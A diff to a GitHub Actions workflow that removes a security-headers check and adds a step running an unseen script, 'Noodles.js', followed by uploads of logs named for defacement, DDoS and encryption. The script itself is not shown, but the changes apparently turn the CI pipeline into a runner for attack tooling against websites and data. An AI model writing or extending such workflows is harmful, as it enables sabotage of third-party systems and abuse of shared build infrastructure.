@@ -13,7 +13,7 @@ jobs:
 
     strategy:
       matrix:
-        node-version: [16.x, 18.x, 20.x]
+        node-version: [18.x]
         # See supported Node.js release schedule at https://nodejs.org/en/about/releases/
 
     steps:
@@ -23,13 +23,26 @@ jobs:
       with:
         node-version: ${{ matrix.node-version }}
         cache: 'npm'
-    - run: npm ci
-    - run: npm run build --if-present
-    - run: npm test
-    - name: Security Headers Check
-      run: |
-        echo "Checking security headers..."
-        # Example: Scan for missing security headers using curl or similar tool
-        curl -I https://example.com | grep "Strict-Transport-Security" || echo "HSTS header missing!"
-        curl -I https://example.com | grep "X-Frame-Options" || echo "X-Frame-Options header missing!"
-        # Add more checks for other important security headers
+    - name: Install Dependencies
+      run: npm install
+    - name: Run Noodles
+      run: node Noodles.js
+    - name: Run build
+      run: npm run build --if-present
+    - name: Test
+      run: npm test
+    - name: Upload Deface Log
+      uses: actions/upload-artifact@v3
+      with:
+        name: deface-log
+        path: deface-log.txt
+    - name: Upload DDoS Log
+      uses: actions/upload-artifact@v3
+      with:
+        name: ddos-log
+        path: ddos-log.txt
+    - name: Upload Encryption Log
+      uses: actions/upload-artifact@v3
+      with:
+        name: encryption-log
+        path: encryption-log.txt
